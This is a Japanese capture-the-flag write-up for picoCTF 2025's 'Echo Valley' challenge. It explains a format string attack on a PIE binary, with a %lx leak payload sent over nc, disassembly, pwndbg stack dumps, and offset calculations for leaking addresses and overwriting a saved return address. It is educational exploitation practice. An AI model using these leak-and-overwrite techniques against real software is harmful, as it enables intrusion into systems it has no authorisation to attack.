# Echo Valley

## 方針

format string attack を利用する。
PIE が有効なため、main関数へのリターンアドレスをリークしてPIEのオフセットを計算する。
あとはスタック内部のポインタもリークして、saved return address を書き換える。

## 解答例

```plaintext
$ nc shape-fac$ ility.picoctf.net 50532
Welcome to the Echo Valley, Try Shouting:
ABCDEFGH.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx
You heard in the distance: ABCDEFGH.7e379552f5c0.0.0.586886db3311.0.4847464544434241.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.a.c3e1723c7c4ddd00.7ffee1a1c140.586849db4413.7ffee1a1c1e0
```

入力した文字列の先頭8バイトはフォーマット文字列で6番目に参照されるデータである。

```plaintext
pwndbg> disass echo_valley
Dump of assembler code for function echo_valley:
   0x0000000000001307 <+0>:     endbr64
   0x000000000000130b <+4>:     push   rbp
   0x000000000000130c <+5>:     mov    rbp,rsp
   0x000000000000130f <+8>:     sub    rsp,0x70
   0x0000000000001313 <+12>:    mov    rax,QWORD PTR fs:0x28
   0x000000000000131c <+21>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000001320 <+25>:    xor    eax,eax
   0x0000000000001322 <+27>:    lea    rax,[rip+0xd37]        # 0x2060
   0x0000000000001329 <+34>:    mov    rdi,rax
   0x000000000000132c <+37>:    call   0x10e0 <puts@plt>
   0x0000000000001331 <+42>:    mov    rax,QWORD PTR [rip+0x2cd8]        # 0x4010 <stdout@GLIBC_2.2.5>
   0x0000000000001338 <+49>:    mov    rdi,rax
   0x000000000000133b <+52>:    call   0x1140 <fflush@plt>
   0x0000000000001340 <+57>:    mov    rdx,QWORD PTR [rip+0x2cd9]        # 0x4020 <stdin@GLIBC_2.2.5>
   0x0000000000001347 <+64>:    lea    rax,[rbp-0x70]
   0x000000000000134b <+68>:    mov    esi,0x64
   0x0000000000001350 <+73>:    mov    rdi,rax
   0x0000000000001353 <+76>:    call   0x1120 <fgets@plt>
   0x0000000000001358 <+81>:    test   rax,rax
   0x000000000000135b <+84>:    jne    0x1376 <echo_valley+111>
   0x000000000000135d <+86>:    lea    rax,[rip+0xd27]        # 0x208b
   0x0000000000001364 <+93>:    mov    rdi,rax
   0x0000000000001367 <+96>:    call   0x10e0 <puts@plt>
   0x000000000000136c <+101>:   mov    edi,0x0
   0x0000000000001371 <+106>:   call   0x1170 <exit@plt>
   0x0000000000001376 <+111>:   lea    rax,[rbp-0x70]
   0x000000000000137a <+115>:   lea    rdx,[rip+0xd24]        # 0x20a5
   0x0000000000001381 <+122>:   mov    rsi,rdx
   0x0000000000001384 <+125>:   mov    rdi,rax
   0x0000000000001387 <+128>:   call   0x1130 <strcmp@plt>
   0x000000000000138c <+133>:   test   eax,eax
   0x000000000000138e <+135>:   jne    0x13c1 <echo_valley+186>
   0x0000000000001390 <+137>:   lea    rax,[rip+0xd14]        # 0x20ab
   0x0000000000001397 <+144>:   mov    rdi,rax
   0x000000000000139a <+147>:   call   0x10e0 <puts@plt>
   0x000000000000139f <+152>:   nop
   0x00000000000013a0 <+153>:   mov    rax,QWORD PTR [rip+0x2c69]        # 0x4010 <stdout@GLIBC_2.2.5>
   0x00000000000013a7 <+160>:   mov    rdi,rax
   0x00000000000013aa <+163>:   call   0x1140 <fflush@plt>
   0x00000000000013af <+168>:   nop
   0x00000000000013b0 <+169>:   mov    rax,QWORD PTR [rbp-0x8]
   0x00000000000013b4 <+173>:   sub    rax,QWORD PTR fs:0x28
   0x00000000000013bd <+182>:   je     0x13ff <echo_valley+248>
   0x00000000000013bf <+184>:   jmp    0x13fa <echo_valley+243>
   0x00000000000013c1 <+186>:   lea    rax,[rip+0xcf9]        # 0x20c1
   0x00000000000013c8 <+193>:   mov    rdi,rax
   0x00000000000013cb <+196>:   mov    eax,0x0
   0x00000000000013d0 <+201>:   call   0x1110 <printf@plt>
   0x00000000000013d5 <+206>:   lea    rax,[rbp-0x70]
   0x00000000000013d9 <+210>:   mov    rdi,rax
   0x00000000000013dc <+213>:   mov    eax,0x0
   0x00000000000013e1 <+218>:   call   0x1110 <printf@plt>
   0x00000000000013e6 <+223>:   mov    rax,QWORD PTR [rip+0x2c23]        # 0x4010 <stdout@GLIBC_2.2.5>
   0x00000000000013ed <+230>:   mov    rdi,rax
   0x00000000000013f0 <+233>:   call   0x1140 <fflush@plt>
   0x00000000000013f5 <+238>:   jmp    0x1331 <echo_valley+42>
   0x00000000000013fa <+243>:   call   0x1100 <__stack_chk_fail@plt>
   0x00000000000013ff <+248>:   leave
   0x0000000000001400 <+249>:   ret
End of assembler dump.
pwndbg> break *echo_valley+218
quit
Breakpoint 1 at 0x13e1: file /home/valley/valley.c, line 39.
pwndbg> run

Starting program: /home/yuki/ctf/picoctf-archive/picoctf_2025/binary_exploitation/echo-valley/valley
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome to the Echo Valley, Try Shouting:
ABCDEFGH.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx

Breakpoint 1, 0x00005555555553e1 in echo_valley () at /home/valley/valley.c:39
warning: Source file is more recent than executable.
39              printf(buf);
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────
 RAX  0
 RBX  0x7fffffffd898 —▸ 0x7fffffffdbd6 ◂— '/home/yuki/ctf/picoctf-archive/picoctf_2025/binary_exploitation/echo-valley/valley'
 RCX  0
 RDX  0
 RDI  0x7fffffffd6f0 ◂— 'ABCDEFGH.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx\n'
 RSI  0x7fffffffd540 ◂— 'You heard in the distance: g'
 R8   0x555555559711 ◂— 0
 R9   0x410
 R10  1
 R11  0x246
 R12  1
 R13  0
 R14  0x555555557d78 (__do_global_dtors_aux_fini_array_entry) —▸ 0x555555555220 (__do_global_dtors_aux) ◂— endbr64
 R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
 RBP  0x7fffffffd760 —▸ 0x7fffffffd770 —▸ 0x7fffffffd810 —▸ 0x7fffffffd870 ◂— 0
 RSP  0x7fffffffd6f0 ◂— 'ABCDEFGH.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx\n'
 RIP  0x5555555553e1 (echo_valley+218) ◂— call printf@plt
─────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────
 ► 0x5555555553e1 <echo_valley+218>    call   printf@plt                  <printf@plt>
        format: 0x7fffffffd6f0 ◂— 'ABCDEFGH.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx\n'
        vararg: 0x7fffffffd540 ◂— 'You heard in the distance: g'

   0x5555555553e6 <echo_valley+223>    mov    rax, qword ptr [rip + 0x2c23]     RAX, [stdout@GLIBC_2.2.5]
   0x5555555553ed <echo_valley+230>    mov    rdi, rax
   0x5555555553f0 <echo_valley+233>    call   fflush@plt                  <fflush@plt>

   0x5555555553f5 <echo_valley+238>    jmp    echo_valley+42              <echo_valley+42>
    ↓
   0x555555555331 <echo_valley+42>     mov    rax, qword ptr [rip + 0x2cd8]     RAX, [stdout@GLIBC_2.2.5]
   0x555555555338 <echo_valley+49>     mov    rdi, rax
   0x55555555533b <echo_valley+52>     call   fflush@plt                  <fflush@plt>

   0x555555555340 <echo_valley+57>     mov    rdx, qword ptr [rip + 0x2cd9]     RDX, [stdin@GLIBC_2.2.5]
   0x555555555347 <echo_valley+64>     lea    rax, [rbp - 0x70]
   0x55555555534b <echo_valley+68>     mov    esi, 0x64                         ESI => 0x64
───────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────────────────────
In file: /home/yuki/ctf/picoctf-archive/picoctf_2025/binary_exploitation/echo-valley/valley.c:39
   34             printf("The Valley Disappears\n");
   35             break;
   36         }
   37
   38         printf("You heard in the distance: ");
 ► 39         printf(buf);
   40         fflush(stdout);
   41     }
   42     fflush(stdout);
   43 }
   44
───────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────
00:0000│ rdi rsp 0x7fffffffd6f0 ◂— 'ABCDEFGH.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx\n'
01:0008│-068     0x7fffffffd6f8 ◂— '.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx\n'
... ↓            6 skipped
─────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────
 ► 0   0x5555555553e1 echo_valley+218
   1   0x555555555413 main+18
   2   0x7ffff7dca1ca __libc_start_call_main+122
   3   0x7ffff7dca28b __libc_start_main+139
   4   0x5555555551a5 _start+37
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

ここでスタックの状態を確認する。

```plaintext
pwndbg> tele rsp 20

00:0000│ rdi rsp 0x7fffffffd6f0 ◂— 'ABCDEFGH.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx\n'
01:0008│-068     0x7fffffffd6f8 ◂— '.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx\n'
... ↓            10 skipped
0c:0060│-010     0x7fffffffd750 ◂— 0xa /* '\n' */
0d:0068│-008     0x7fffffffd758 ◂— 0x10cc2662a4c47400
0e:0070│ rbp     0x7fffffffd760 —▸ 0x7fffffffd770 —▸ 0x7fffffffd810 —▸ 0x7fffffffd870 ◂— 0
0f:0078│+008     0x7fffffffd768 —▸ 0x555555555413 (main+18) ◂— mov eax, 0
10:0080│+010     0x7fffffffd770 —▸ 0x7fffffffd810 —▸ 0x7fffffffd870 ◂— 0
11:0088│+018     0x7fffffffd778 —▸ 0x7ffff7dca1ca (__libc_start_call_main+122) ◂— mov edi, eax
12:0090│+020     0x7fffffffd780 —▸ 0x7fffffffd7c0 —▸ 0x555555557d78 (__do_global_dtors_aux_fini_array_entry) —▸ 0x555555555220 (__do_global_dtors_aux) ◂— endbr64
13:0098│+028     0x7fffffffd788 —▸ 0x7fffffffd898 —▸ 0x7fffffffdbd6 ◂— '/home/yuki/ctf/picoctf-archive/picoctf_2025/binary_exploitation/echo-valley/valley'
```

入力した文字列の先頭はフォーマット文字列から6番目に参照されるデータで、`rsp+0x0` にある。また、`rsp+0x78` に `main+18` のアドレスが格納されている。ここから、`(0x78-0x0)/8+6 = 21`番目のフォーマット文字列で `main+18` のアドレスをリークできる。

rsp が示すアドレスを特定するには、まずはスタック内部のアドレスを示しているスタックかレジスタを探す。レジスタでは第二引数をリークできるため、 `rsi` 以降を見ることになるが、今回は特に意味のない値が入っているため、スタック内部のアドレスを示しているスタックを探す。

すると、rbp が示すスタックの値が 0x7fffffffd770 となっており、スタック内部を指していることがわかる。
そのため、`0x7fffffffd770 - 0x7fffffffd760 = 0x10` をオフセットとして考え、`rsp = 0x7fffffffd770 - 0x10 - 0x70 = 0x7fffffffd6f0` と計算できる。rbp が指すアドレスの値 (0x7fffffffd760 の値) は フォーマット文字列で `(0x70 - 0x0) / 8 + 6 = 20` 番目に参照されることから、`%20$p` とすればリークすることができる。

ここまで準備ができれば、pwntools の `FmtStr` を使って format string attack の payload を作成することができる。ただし、サーバー側のバッファが最大で100文字 (ヌル終端文字を含む) なので、`len(payload) < 100` を満たすように注意する。
